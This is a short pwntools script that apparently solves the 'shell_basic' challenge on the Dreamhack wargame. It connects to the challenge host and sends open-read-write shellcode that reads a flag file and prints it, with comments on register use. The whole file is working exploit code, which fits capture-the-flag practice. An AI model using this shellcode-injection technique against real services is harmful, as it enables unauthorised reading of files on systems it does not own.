from pwn import *

p = remote('host3.dreamhack.games', 23815)

context.arch = 'amd64'
r = b"/home/shell_basic/flag_name_is_loooooong"

shellcode=''
shellcode+=shellcraft.open(r, 0, 0) # rax(rdi,rsi,rdx) then the r is store in rax(open)
shellcode+=shellcraft.read('rax','rsp',0x100) # read(fd,buf,0x100)-> rax(rdi,rsi,rdx) here rdi<- rax(result of open), since rsp always pointing the upmost part of stack it is for rsi(source index)
shellcode+=shellcraft.write(1, 'rsp', 0x100)

p.sendlineafter(': ', asm(shellcode))

print(p.recvline()[:-1]) #print except /n 
